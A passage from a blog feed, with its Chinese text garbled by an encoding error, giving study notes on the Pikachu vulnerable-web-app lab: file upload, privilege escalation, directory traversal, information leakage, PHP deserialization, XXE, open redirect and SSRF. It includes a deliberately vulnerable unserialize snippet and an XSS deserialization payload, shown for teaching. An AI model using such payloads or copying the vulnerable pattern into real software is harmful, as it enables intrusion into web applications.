href="#Unsafe-file-uploads-ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="Unsafe file uploads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ )"></a>Unsafe file uploads(ä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ )</h1><h2 id="æ¦‚è¿°-7"><a href="#æ¦‚è¿°-7" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿå¾ˆå¸¸è§ï¼Œæ¯”å¦‚å¾ˆå¤šç½‘ç«™æ³¨å†Œçš„æ—¶å€™éœ€è¦ä¸Šä¼ å¤´åƒã€ä¸Šä¼ é™„ä»¶ç­‰ç­‰ã€‚å½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œåå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­ æ¯”å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ã€‚å¦‚æœè¯´åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œåˆ™æ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æ¶æ„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚<br>æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ã€‚æ¯”å¦‚ï¼š<br>â€“éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°;<br>â€“éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;<br>â€“å¯¹æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å;<br>â€“ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;<br>â€“ç­‰ç­‰</p><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><h1 id="Over-Permisson-è¶Šæƒæ¼æ´"><a href="#Over-Permisson-è¶Šæƒæ¼æ´" class="headerlink" title="Over Permisson(è¶Šæƒæ¼æ´)"></a>Over Permisson(è¶Šæƒæ¼æ´)</h1><h2 id="æ¦‚è¿°-8"><a href="#æ¦‚è¿°-8" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>å¦‚æœä½¿ç”¨Aç”¨æˆ·çš„æƒé™å»æ“ä½œBç”¨æˆ·çš„æ•°æ®ï¼ŒAçš„æƒé™å°äºBçš„æƒé™ï¼Œå¦‚æœèƒ½å¤ŸæˆåŠŸæ“ä½œï¼Œåˆ™ç§°ä¹‹ä¸ºè¶Šæƒæ“ä½œã€‚è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº† ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚<br>ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚<br>å› æ­¤ï¼Œåœ¨åœ¨æƒé™ç®¡ç†ä¸­åº”è¯¥éµå®ˆï¼š</p><ol><li>ä½¿ç”¨æœ€å°æƒé™åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œèµ‹æƒ;</li><li>ä½¿ç”¨åˆç†ï¼ˆä¸¥æ ¼ï¼‰çš„æƒé™æ ¡éªŒè§„åˆ™;</li><li>ä½¿ç”¨åå°ç™»å½•æ€ä½œä¸ºæ¡ä»¶è¿›è¡Œæƒé™åˆ¤æ–­,åˆ«åŠ¨ä¸åŠ¨å°±çç”¨å‰ç«¯ä¼ è¿›æ¥çš„æ¡ä»¶;</li></ol><h2 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h2><h2 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h2><h1 id="x2F-x2F-x2F-ç›®å½•éå†"><a href="#x2F-x2F-x2F-ç›®å½•éå†" class="headerlink" title="..&#x2F;..&#x2F;..&#x2F;(ç›®å½•éå†)"></a>..&#x2F;..&#x2F;..&#x2F;(ç›®å½•éå†)</h1><h2 id="æ¦‚è¿°-9"><a href="#æ¦‚è¿°-9" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™æˆ‘ä»¬ä¼šè¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½ä¾¿çš„æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œ..&#x2F;â€è¿™æ ·çš„æ‰‹æ®µè®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ã€‚ ä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼Œå½¢æˆç›®å½•éå†æ¼æ´ã€‚<br>çœ‹åˆ°è¿™é‡Œ,ä½ å¯èƒ½ä¼šè§‰å¾—ç›®å½•éå†æ¼æ´å’Œä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½ï¼Œç”šè‡³æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å·®ä¸å¤šçš„æ„æ€ï¼Œæ˜¯çš„ï¼Œç›®å½•éå†æ¼æ´å½¢æˆçš„æœ€ä¸»è¦çš„åŸå› è·Ÿè¿™ä¸¤è€…ä¸€æ ·ï¼Œéƒ½æ˜¯åœ¨åŠŸèƒ½è®¾è®¡ä¸­å°†è¦æ“ä½œçš„æ–‡ä»¶ä½¿ç”¨å˜é‡çš„ æ–¹å¼ä¼ é€’ç»™äº†åå°ï¼Œè€Œåˆæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘è€Œé€ æˆçš„ï¼Œåªæ˜¯å‡ºç°çš„ä½ç½®æ‰€å±•ç°çš„ç°è±¡ä¸ä¸€æ ·ï¼Œå› æ­¤ï¼Œè¿™é‡Œè¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥å®šä¹‰ä¸€ä¸‹ã€‚<br>éœ€è¦åŒºåˆ†ä¸€ä¸‹çš„æ˜¯,å¦‚æœä½ é€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆæ¯”å¦‚ï¼š<a href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82%E8%80%8C%E5%B9%B6%E4%B8%8D%E5%BD%92%E4%B8%BA%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E3%80%82%EF%BC%88%E5%85%B3%E4%BA%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%BD%A0%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8&quot;i">http://xxxx/docï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚è€Œå¹¶ä¸å½’ä¸ºç›®å½•éå†æ¼æ´ã€‚ï¼ˆå…³äºæ•æ„Ÿä¿¡æ¯æ³„éœ²ä½ ä½ å¯ä»¥åœ¨&quot;i</a> can see you ABCâ€ä¸­äº†è§£æ›´å¤šï¼‰</p><h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h2><h1 id="I-can-see-your-ABC-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#I-can-see-your-ABC-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="I can see your ABC(æ•æ„Ÿä¿¡æ¯æ³„éœ²)"></a>I can see your ABC(æ•æ„Ÿä¿¡æ¯æ³„éœ²)</h1><h2 id="æ¦‚è¿°-10"><a href="#æ¦‚è¿°-10" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ã€‚æ¯”å¦‚ï¼š<br>â€”é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨;<br>â€”è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯;<br>â€”å‰ç«¯çš„æºç ï¼ˆhtml,css,jsï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰;<br>ç±»ä¼¼ä»¥ä¸Šè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬æˆä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚æ•æ„Ÿä¿¡æ¯æ³„éœ²è™½ç„¶ä¸€ç›´è¢«è¯„ä¸ºå±å®³æ¯”è¾ƒä½çš„æ¼æ´ï¼Œä½†è¿™äº›æ•æ„Ÿä¿¡æ¯å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©,ç”šè‡³â€œç¦»è°±â€çš„æ•æ„Ÿä¿¡æ¯æ³„éœ²ä¹Ÿä¼šç›´æ¥é€ æˆä¸¥é‡çš„æŸå¤±ã€‚å› æ­¤,åœ¨webåº”ç”¨çš„å¼€å‘ä¸Šï¼Œé™¤äº†è¦è¿›è¡Œå®‰å…¨çš„ä»£ç ç¼–å†™ï¼Œä¹Ÿéœ€è¦æ³¨æ„å¯¹æ•æ„Ÿä¿¡æ¯çš„åˆç†å¤„ç†ã€‚         </p><h2 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h2><h1 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a>PHPååºåˆ—åŒ–æ¼æ´</h1><h2 id="æ¦‚è¿°-11"><a href="#æ¦‚è¿°-11" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>åœ¨ç†è§£è¿™ä¸ªæ¼æ´å‰,ä½ éœ€è¦å…ˆææ¸…æ¥šphpä¸­serialize()ï¼Œunserialize()è¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p><h3 id="åºåˆ—åŒ–serialize"><a href="#åºåˆ—åŒ–serialize" class="headerlink" title="åºåˆ—åŒ–serialize()"></a>åºåˆ—åŒ–serialize()</h3><p>åºåˆ—åŒ–è¯´é€šä¿—ç‚¹å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²,æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå¯¹è±¡:            </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">   <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//æŠŠè¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">   åºåˆ—åŒ–åå¾—åˆ°çš„ç»“æœæ˜¯è¿™ä¸ªæ ·å­çš„:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">       O:ä»£è¡¨<span class="keyword">object</span></span><br><span class="line">       <span class="number">1</span>:ä»£è¡¨å¯¹è±¡åå­—é•¿åº¦ä¸ºä¸€ä¸ªå­—ç¬¦</span><br><span class="line">       S:å¯¹è±¡çš„åç§°</span><br><span class="line">       <span class="number">1</span>:ä»£è¡¨å¯¹è±¡é‡Œé¢æœ‰ä¸€ä¸ªå˜é‡</span><br><span class="line">       s:æ•°æ®ç±»å‹</span><br><span class="line">       <span class="number">4</span>:å˜é‡åç§°çš„é•¿åº¦</span><br><span class="line">       test:å˜é‡åç§°</span><br><span class="line">       s:æ•°æ®ç±»å‹</span><br><span class="line">       <span class="number">7</span>:å˜é‡å€¼çš„é•¿åº¦</span><br><span class="line">       pikachu:å˜é‡å€¼</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–unserialize"><a href="#ååºåˆ—åŒ–unserialize" class="headerlink" title="ååºåˆ—åŒ–unserialize()"></a>ååºåˆ—åŒ–unserialize()</h3><p>å°±æ˜¯æŠŠè¢«åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸä¸ºå¯¹è±¡,ç„¶ååœ¨æ¥ä¸‹æ¥çš„ä»£ç ä¸­ç»§ç»­ä½¿ç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//å¾—åˆ°çš„ç»“æœä¸ºpikachu</span></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜,ä½†æ˜¯å¦‚æœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„,ä¸”åå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°,å°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">å¸¸è§çš„å‡ ä¸ªé­”æ³•å‡½æ•°:</span><br><span class="line">        <span class="title function_ invoke__">__construct</span>()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">__destruct</span>()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">__toString</span>()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">__sleep</span>() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span><br><span class="line"></span><br><span class="line">        __wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</span><br><span class="line"></span><br><span class="line">        æ¼æ´ä¸¾ä¾‹:</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">        @<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">        payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="phpååºåˆ—åŒ–æ¼æ´"><a href="#phpååºåˆ—åŒ–æ¼æ´" class="headerlink" title="phpååºåˆ—åŒ–æ¼æ´"></a>phpååºåˆ—åŒ–æ¼æ´</h2><h1 id="XXE-XML-External-Entity-attack"><a href="#XXE-XML-External-Entity-attack" class="headerlink" title="XXE(XML External Entity attack)"></a>XXE(XML External Entity attack)</h1><h2 id="æ¦‚è¿°-12"><a href="#æ¦‚è¿°-12" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>XXE -â€œxml external entity injectionâ€<br>æ—¢â€xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´â€ã€‚<br>æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯â€æ”»å‡»è€…é€šè¿‡å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹,ä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜â€<br>ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯æ¥æ”¶å’Œè§£æäº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚<br>å…·ä½“çš„å…³äºxmlå®ä½“çš„ä»‹ç»,ç½‘ç»œä¸Šæœ‰å¾ˆå¤š,è‡ªå·±åŠ¨æ‰‹å…ˆæŸ¥ä¸€ä¸‹ã€‚<br>ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚<br>ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxml,å…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚<br>æœ¬ç« æä¾›çš„æ¡ˆä¾‹ä¸­,ä¸ºäº†æ¨¡æ‹Ÿæ¼æ´,é€šè¿‡æ‰‹åŠ¨æŒ‡å®šLIBXML_NOENTé€‰é¡¹å¼€å¯äº†xmlå¤–éƒ¨å®ä½“è§£æã€‚  </p><h2 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h2><h1 id="ä¸å®‰å…¨çš„URLé‡å®šå‘"><a href="#ä¸å®‰å…¨çš„URLé‡å®šå‘" class="headerlink" title="ä¸å®‰å…¨çš„URLé‡å®šå‘"></a>ä¸å®‰å…¨çš„URLé‡å®šå‘</h1><h2 id="æ¦‚è¿°-13"><a href="#æ¦‚è¿°-13" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>ä¸å®‰å…¨çš„urlè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†urlåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚<br>å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„urlåœ°å€)å‚æ•°ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯å°±å¯èƒ½å‘ç”Ÿâ€è·³é”™å¯¹è±¡â€çš„é—®é¢˜ã€‚<br>urlè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:<br>â€“&gt;é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</p><h2 id="ä¸å®‰å…¨çš„URLè·³è½¬"><a href="#ä¸å®‰å…¨çš„URLè·³è½¬" class="headerlink" title="ä¸å®‰å…¨çš„URLè·³è½¬"></a>ä¸å®‰å…¨çš„URLè·³è½¬</h2><h1 id="SSRF-Server-Side-Request-Forgeryï¼šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ "><a href="#SSRF-Server-Side-Request-Forgeryï¼šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ " class="headerlink" title="SSRF(Server-Side Request Forgeryï¼šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )"></a>SSRF(Server-Side Request Forgeryï¼šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</h1><h2 id="æ¦‚è¿°-14"><a href="#æ¦‚è¿°-14" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯<strong>æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong>,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶<br>å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®<br>æ•°æ®æµ:æ”»å‡»è€…â€”â€“&gt;æœåŠ¡å™¨â€”-&gt;ç›®æ ‡åœ°å€<br>æ ¹æ®åå°ä½¿ç”¨çš„å‡½æ•°çš„ä¸åŒ,å¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(â€œæˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚â€)çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,<strong>åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤</strong>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonåŸºç¡€å­¦ä¹ ç¬”è®°</title>
      <link href="/posts/1327/"/>
      <url>/posts/1327/</url>
      
